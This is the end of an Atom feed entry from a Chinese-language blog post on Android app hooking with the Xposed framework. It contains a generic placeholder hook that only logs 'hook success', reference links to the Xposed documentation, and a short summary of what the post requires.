XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        findAndHookMethod(<span class="string">"com.example.test.xxxx"</span>, lpparam.classLoader, <span class="string">"methodName"</span>, Context.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            XposedBridge.log(<span class="string">"hook success"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://mp.weixin.qq.com/s/4-6fNOLEZbu80JVSgHcPSg" title="Xposed框架" target="_blank" rel="noopener">微信公众号Xposed框架</a></li><li><a href="https://github.com/rovo89/XposedBridge/wiki/" title="Xposed官方教程" target="_blank" rel="noopener">Xposed官方教程</a></li><li><a href="http://api.xposed.info/reference/packages.html" target="_blank" rel="noopener">框架API详细介绍</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Xposed是Android常用的java层的hook框架。可以方便的对目标代码进行修改和监控&lt;/p&gt;
&lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;已经root的android（如果使用VirtualXposed可以不root）&lt;/li&gt;
&lt;li&gt;推荐使用&lt;a href=&quot;https://github.com/android-hacker/VirtualXposed&quot; title=&quot;VirtualXposed Github&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;VirtualXposed&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;当然还有Android开发环境（Android studio）&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="android" scheme="https://bigkan.github.io/tags/android/"/>
    
      <category term="xposed" scheme="https://bigkan.github.io/tags/xposed/"/>
    
      <category term="hook" scheme="https://bigkan.github.io/tags/hook/"/>
    
  </entry>
  
</feed>
